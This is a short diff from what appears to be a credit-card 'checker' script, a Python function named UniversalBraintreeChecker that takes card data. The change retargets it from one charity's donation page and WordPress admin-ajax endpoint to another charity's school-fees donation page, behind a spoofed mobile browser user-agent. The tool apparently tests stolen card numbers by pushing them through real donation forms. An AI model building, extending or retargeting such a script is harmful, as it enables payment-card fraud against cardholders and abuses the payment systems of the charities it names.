@@ -357,9 +357,9 @@ def UniversalBraintreeChecker(ccx):
         yy = yy.split("20")[1]
     
     pipo = requests.session()		
-    url = 'https://sylvanhealing.org/donations-page/'
+    url = 'https://fightagainstpovertyassociation.com/donations/school-fees/'
     
-    url_1 ='https://sylvanhealing.org/wp-admin/admin-ajax.php'
+    url_1 ='https://fightagainstpovertyassociation.com/wp-admin/admin-ajax.php'
     headers = {
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
     }
